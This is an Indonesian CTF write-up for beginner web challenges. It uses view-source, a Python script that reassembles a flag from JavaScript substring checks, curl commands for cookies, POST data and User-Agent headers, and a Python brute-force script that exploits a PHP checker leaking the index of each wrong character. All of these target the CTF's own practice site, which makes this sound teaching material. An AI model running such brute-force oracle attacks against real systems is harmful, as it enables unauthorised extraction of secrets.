Website Challange CTF [Klik disini](https://rasyidmf.com/)

# WEBSITE EXPLOITATION

## Welcome To CTFR

ctrl+u / view-source, akan mendapatkan flagnya

## Substring JS

disediakan script substring

```javascript
var flag = "";
if (flag.substring(0, 4) == "CTFR") {
  if (flag.substring(2, 7) == "FR{s1") {
    if (flag.substring(5, 10) == "s1mpl") {
      if (flag.substring(9, 13) == "l3_j") {
        if (flag.substring(10, 13) == "3_j") {
          if (flag.substring(13, 18) == "4v45c") {
            if (flag.substring(18, 26) == "r1pt}") {
              console.log("Here is your flag: " + flag);
            }
          }
        }
      }
    }
  }
}
```

untuk mendapatkan flag tersebut menggunakan automation

```python
import requests
import re

r = requests.get('https://web.ctf.rasyidmf.com/chal2')
response = r.text

regex = r"flag\.substring\((.*), (.*)\) == \"(.*?)\""
matchAll = re.findall(regex, response)
flag = list('')

for match in matchAll:
    flag[int(match[0]):int(match[1])] = match[2]

print(''.join(flag))
```

## Cookie

disediakan website biasa, yang harus mendapatkan cookie website tersebut, ada 2 cara. <br>
Cara pertama menggunakan tools **Cookie Editor**
<br>
Cara kedua menggunakan command

```bash
curl --head -s https://web.ctf.rasyidmf.com/chal3/ | awk '/set-cookie: flag=/{print $2}' | sed 's/flag=//g' | python3 -c "import sys; from urllib.parse import unquote; print(unquote(sys.stdin.read()));" | sed 's/\;//g'
```

## Post Practice

harus request method post dan parameternya flag=1

```bash
curl -X POST --data "flag=1" -s https://web.ctf.rasyidmf.com/chal4/ | awk '/Flag :/{print $3}' | sed 's/<br>//g'
```

## User-Agent

website yang mengharuskan user-agentnya CTFR

```bash
 curl --header -s "User-Agent: CTFR" https://web.ctf.rasyidmf.com/chal5/ | awk '/Flag : /{print $3}'
```

## Brut3f0rc3 #1

disediakan input text yang untuk di bruteforce flagnya

Script phpnya:

```php
<?php
include 'flag.php';
    $input = @$_GET['flag'];
    if ($input != "" && strlen($input) == 36) {
        $res = "";
        for($i = 0; $i < 36; $i++) {
            if ($flag[$i] == $input[$i]) {
                $res .= $flag[$i];
            } else {
                echo "Karakter pada index <b>$i</b> : <b>$input[$i]</b> tidak sama dengan flag yang ada<br><br>";
                return;
            }
        }
        echo "Here is your flag : " . $flag . "<br><br>";
    }
?>
```

Script brutefocenya:

```python
import requests
import string
import re

def striphtml(data):
    p = re.compile(r'<.*?>')
    return p.sub('', data)

def generatePayload(index):
    lowerCase = string.ascii_lowercase
    number = string.digits
    simbol = "_"

    gabung = lowerCase + number + simbol
    arr = list(gabung)

    return arr[index]

def request(url, payload, indexError):
    regex = r"<b>(.*?)<\/b>"
    regexSuccess = r"Here is your flag : (.*)"

    r =  requests.get(url + payload)
    data = r.text
    getIndexError = re.findall(regex, data)
    getFlag = re.findall(regexSuccess, data)

    if len(getIndexError) > 0 and int(getIndexError[0]) == indexError:
        return True
    elif len(getFlag) > 0:
        return getFlag[0]
    else:
        return False

def exploit():
    url = "https://web.ctf.rasyidmf.com/chal16/?flag="
    payload = list("CTFR{" + 'a'*30 + "}")

    indexPayload = 0
    indexError = 5

    while True:
        payloadReq = ''.join(payload)
        requestPayload = request(url, payloadReq, indexError)

        if requestPayload:
            indexPayload = indexPayload + 1
            if indexPayload == 37:
                indexPayload = 0
        else:
            indexError = indexError + 1

        payload[indexError] = generatePayload(indexPayload)

        print(f"[~] Trying BruteForce : {payloadReq}", end="\r", flush=True)

        if type(requestPayload) == str:
            print(f"[+] Found Flag : {striphtml(requestPayload)}", end="\n", flush=True)
            break


if __name__ == '__main__':
    exploit()
```
